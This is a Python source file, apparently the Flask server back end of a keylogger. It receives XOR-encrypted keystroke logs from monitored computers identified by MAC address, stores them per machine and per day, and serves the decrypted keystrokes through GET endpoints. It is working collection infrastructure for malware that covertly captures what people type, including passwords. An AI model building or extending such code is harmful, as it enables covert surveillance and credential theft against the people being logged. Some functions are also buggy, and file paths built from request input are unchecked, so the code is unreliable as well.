import json
import os
from computers_names import ComputersNames
from users_data import UsersData
from datetime import datetime
from flask import request


class RequestFunctions:
    """Class handling various requests coming to the server"""

    def __init__(self, base_dir_path: str, decryption_key: str | int):
        """
        Initialize an instance for managing computer names being tracked,
        Initialize an instance for managing user names and passwords,
        Set paths for basic data files, and set the decryption key.
        """
        self.computers_names = ComputersNames(os.path.join(base_dir_path, 'computers_names.json'))
        self.users_data = UsersData(os.path.join(base_dir_path, 'users_data.json'))
        self.all_data_path = os.path.join(base_dir_path, 'data')
        self.loger_data_path = os.path.join(base_dir_path, 'data', 'key_loger_data')
        self.errors_data_path = os.path.join(base_dir_path, 'errors_data.txt')
        self.decryption_key = decryption_key

    # POST requests

    def upload(self):
        """Upload data to the database"""
        data = request.get_json()
        # Validate data format
        if not isinstance(data, dict):
            return {'Error': 'Invalid JSON format'}
        mac = data.get('mac')
        time = data.get('time')
        log_data = data.get('data')
        if (not isinstance(mac, str)) or (not isinstance(time, str)) or (not isinstance(log_data, str)):
            return {'Error': 'Invalid payload'}

        # Validate time format
        try:
            time_tamp = datetime.strptime(time, "%d-%m-%Y %H:%M:%S")
            file_name = f'{time_tamp.strftime("%d-%m-%Y")}.txt'
        except ValueError:
            return {'Error': 'Invalid time format'}

        # Get computer name
        try:
            machine = self.computers_names.get_name(mac)
            if not machine:
                self.computers_names.add(mac)
                machine = self.computers_names.get_name(mac)
        except Exception as e:
            return {'Error': f'Error finding computer name {e}'}

        # If there is an error adding the computer to the file, return the error
        if 'Error' in self.computers_names.computers:
            return {'Error': self.computers_names.computers['Error']}

        # Define folder name and create it if needed
        machine_folder = os.path.join(self.loger_data_path, machine)
        try:
            os.makedirs(machine_folder, exist_ok=True)
        except Exception as e:
            return {'Error': f'Error creating folder: {e}'}

        # Format the data and write it to the corresponding file
        json_data = json.dumps({time: log_data})
        file_path = os.path.join(machine_folder, file_name)
        try:
            with open(file_path, 'a', encoding="utf-8") as file:
                file.write(json_data + '\n')
        except Exception as e:
            return {'Error': f'Error writing to file: {e}'}
        return {"status": "success", "file": file_name}

    def login(self):
        """User login validation"""
        login_data = request.get_json()
        if not isinstance(login_data, dict):
            return {'Error': 'Invalid JSON format'}
        user_name = login_data.get('user_name')
        password = login_data.get('password')
        if not isinstance(user_name, str) or not isinstance(password, str):
            return {'Error': 'Invalid payload'}
        if self.users_data.check_user(user_name, password):
            return {'Status': 'Confirm'}
        return {'Failed': 'Not confirmed'}

    # TODO check computer name, can be None
    def send_error(self):
        """Send error type in case of an error on the monitored computer"""
        error_data = request.data.decode("utf-8").strip()
        if not error_data:  # Check if the data is empty
            return {'Error': 'Empty request data'}
        try:
            with open(self.errors_data_path, 'a', encoding="utf-8") as file:
                file.write(error_data + '\n')
        except Exception as e:
            return {'Error': f'Error writing to file: {e}'}
        return {"status": "success"}

    # GET requests

    def get_machines_names(self):
        """Get the list of computer names being tracked"""
        machines = os.listdir(self.loger_data_path)
        return {'machines': machines}

    def get_dates_by_name(self, name):
        """Get the list of dates for a specific computer"""
        machine_path = os.path.join(self.loger_data_path, name)
        if not os.path.exists(machine_path):
            return {'Error': f'Machine folder "{name}" not found'}
        dates = os.listdir(machine_path)
        return {'dates': dates}

    def get_keystrokes_by_name_and_date(self, name, date):
        """Get keystroke data for a specific computer on a specific day"""
        data_path = os.path.join(self.loger_data_path, name, date)
        if not os.path.exists(data_path):
            return {'Error': f'File {date} for {name} not found'}
        result = {}
        with open(data_path, 'r', encoding='utf-8') as file:
            for line in file:
                data_dict = json.loads(line.strip())
                for time, loger_data in data_dict.items():
                    result[time] = self._xor_decryption(loger_data, self.decryption_key)
        return result

    def get_error_file(self):
        os.makedirs(self.errors_data_path, exist_ok=True)
        result = {}
        with open(self.errors_data_path, 'r', encoding='utf-8') as file:
            for line in file:
                data = json.loads(line.strip())
                mac, time, error_data = data.get('mac'), data.get('time'), data.get('error_data'),
                result[mac] = {'time': time, 'error_data': error_data}
        return result

    @staticmethod
    def _xor_decryption(data: str, key: str | int) -> str:
        """Decrypt data based on its encryption"""
        key = key % 256 if isinstance(key, int) else key
        result = ""
        if isinstance(key, int):  # The key is an integer
            for char in data:
                result += chr(ord(char) ^ key)
        else:  # The key is a string
            for i in range(len(data)):
                result += chr(ord(data[i]) ^ ord(key[i % len(key)]))
        return result
